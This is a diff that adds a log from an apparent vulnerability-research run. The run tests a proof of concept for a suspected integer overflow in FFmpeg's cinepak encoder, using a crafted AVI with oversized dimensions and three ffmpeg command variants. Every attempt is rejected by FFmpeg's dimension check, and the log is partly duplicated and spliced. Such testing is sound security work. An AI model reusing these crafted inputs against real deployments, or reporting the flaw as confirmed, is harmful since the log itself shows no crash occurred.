@@ -1,0 +1,123 @@
+=== VULN 001 PoC: cinepak_encode_init integer overflow ===
+Date: Mon Sep  7 07:21:11 PM +08 2026
+
+[*] Generating malicious AVI...
+[+] Written 266 bytes to /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_cinepakenc_c/vuln_001_input.avi
+[+] AVI dimensions: 4x178956972
+[+] Expected overflow: 6*4*178956972 = 4294967328 (int32 wraps to 32 → signed 32)
+[+] Overflowed >> 2 = 8
+[+] Done.
+
+[*] Approach A: AVI with overflow dimensions (4x178956972)
+    Command: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -i vuln_001_input.avi -c:v cinepak -f avi /dev/null
+
+[*] ASAN log from Approach A:
+    (no ASAN log)
+
+[*] Approach B: lavfi color source with overflow dimensions
+    Command: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -f lavfi -i color=size=4x178956972:rate=1 -frames:v 1 -c:v cinepak -f avi /dev/null
+
+[*] ASAN log from Approach B:
+    (no ASAN log)
+
+[*] Approach C: rawvideo 4x4 with -s 4x178956972 output resize for encoder
+    Command: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -f rawvideo -pix_fmt rgb24 -s 4x4 -r 1 -i /tmp/tiny_frame.raw -vf scale=4:178956972 -c:v cinepak -f avi /dev/null
+
+[*] ASAN log from Approach C:
+    (no ASAN log)
+
+[*] Checking result for crash indicators...
+SIZE_CHECK_TRIGGERED - overflow blocked by dimension validation
+
+=== Done ===
+0 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[cinepak @ 0x519000000a80] [IMGUTILS @ 0x77448d7113a0] Picture size 4x178956972 is invalid
+[in#0/avi @ 0x517000000080] Failed to open codec in avformat_find_stream_info
+[in#0/avi @ 0x517000000080] Could not find codec parameters for stream 0 (Video: cinepak (CVID / 0x44495643), rgb24): unspecified size
+Consider increasing the value for the 'analyzeduration' (0) and 'probesize' (5000000) options
+Input #0, avi, from 'vuln_001_input.avi':
+  Duration: 00:00:00.04, start: 0.000000, bitrate: 53 kb/s
+  Stream #0:0: Video: cinepak (CVID / 0x44495643), rgb24, 25 fps, 25 tbr, 25 tbn
+Stream mapping:
+  Stream #0:0 -> #0:0 (cinepak (native) -> cinepak (native))
+Press [q] to stop, [?] for help
+[graph -1 input from stream 0:0 @ 0x511000010300] Invalid size 0x0
+[vf#0:0 @ 0x51a000000680] Error initializing filters!
+[vf#0:0 @ 0x51a000000680] Task finished with error: Invalid argument
+[vf#0:0 @ 0x51a000000680] Terminating thread with error: Invalid argument
+[vost#0:0/cinepak @ 0x517000000780] [enc:cinepak @ 0x5110000011c0] Could not open encoder before EOF
+[vost#0:0/cinepak @ 0x517000000780] Task finished with error: Invalid argument
+[vost#0:0/cinepak @ 0x517000000780] Terminating thread with error: Invalid argument
+[out#0/avi @ 0x511000000cc0] Nothing was written into output file, because at least one of its streams received no packets.
+frame=    0 fps=0.0 q=0.0 Lsize=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+Conversion failed!
+
+[*] ASAN log from Approach A:
+    (no ASAN log)
+
+[*] Approach B: lavfi color source with overflow dimensions
+    Command: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -f lavfi -i color=size=4x178956972:rate=1 -frames:v 1 -c:v cinepak -f avi /dev/null
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[Parsed_color_0 @ 0x511000000680] [IMGUTILS @ 0x7c9470111320] Picture size 4x178956972 is invalid
+[Parsed_color_0 @ 0x511000000680] Failed to configure output pad on Parsed_color_0
+[in#0 @ 0x513000000200] Error opening input: Invalid argument
+Error opening input file color=size=4x178956972:rate=1.
+Error opening input files: Invalid argument
+
+[*] ASAN log from Approach B:
+    (no ASAN log)
+
+[*] Approach C: rawvideo 4x4 with -s 4x178956972 output resize for encoder
+    Command: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -f rawvideo -pix_fmt rgb24 -s 4x4 -r 1 -i /tmp/tiny_frame.raw -vf scale=4:178956972 -c:v cinepak -f avi /dev/null
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[in#0/rawvideo @ 0x517000000080] Estimating duration from bitrate, this may be inaccurate
+Input #0, rawvideo, from '/tmp/tiny_frame.raw':
+  Duration: 00:00:01.00, start: 0.000000, bitrate: 0 kb/s
+  Stream #0:0: Video: rawvideo (RGB[24] / 0x18424752), rgb24, 4x4, 0 kb/s, 1 tbr, 1 tbn
+Stream mapping:
+  Stream #0:0 -> #0:0 (rawvideo (native) -> cinepak (native))
+Press [q] to stop, [?] for help
+[Parsed_scale_0 @ 0x511000010300] [IMGUTILS @ 0x75ef8f3115a0] Picture size 4x178956972 is invalid
+[vf#0:0 @ 0x51a000000080] Error reinitializing filters!
+[vf#0:0 @ 0x51a000000080] Task finished with error: Invalid argument
+[vf#0:0 @ 0x51a000000080] Terminating thread with error: Invalid argument
+[vost#0:0/cinepak @ 0x517000000780] [enc:cinepak @ 0x5110000011c0] Could not open encoder before EOF
+[vost#0:0/cinepak @ 0x517000000780] Task finished with error: Invalid argument
+[vost#0:0/cinepak @ 0x517000000780] Terminating thread with error: Invalid argument
+[out#0/avi @ 0x511000000cc0] Nothing was written into output file, because at least one of its streams received no packets.
+frame=    0 fps=0.0 q=0.0 Lsize=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+Conversion failed!
+
+[*] ASAN log from Approach C:
+    (no ASAN log)
+
+[*] Checking result for crash indicators...
+SIZE_CHECK_TRIGGERED - overflow blocked by dimension validation
+
+=== Done ===
+EXIT=0
+EXIT=0
